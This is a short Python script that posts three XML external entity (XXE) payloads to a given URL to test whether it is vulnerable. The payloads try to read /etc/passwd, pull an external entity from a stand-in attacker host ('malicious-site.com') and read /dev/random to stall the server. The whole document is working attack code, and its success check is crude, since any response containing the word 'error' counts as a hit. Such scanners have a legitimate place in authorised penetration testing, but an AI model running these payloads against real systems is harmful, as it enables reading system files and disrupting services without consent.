import requests
import re

def is_xxe_vulnerable(url):
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "http://malicious-site.com/malicious.xml" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///dev/random" >] >
        <foo>&xxe;</foo>"""
    ]
    
    headers = {'Content-Type': 'application/xml'}
    vulnerable = False
    for payload in payloads:
        response = requests.post(url, data=payload, headers=headers)
        if "root" in response.text or "passwd" in response.text or "error" in response.text:
            print("XXE payload worked.")
            vulnerable = True
    return vulnerable
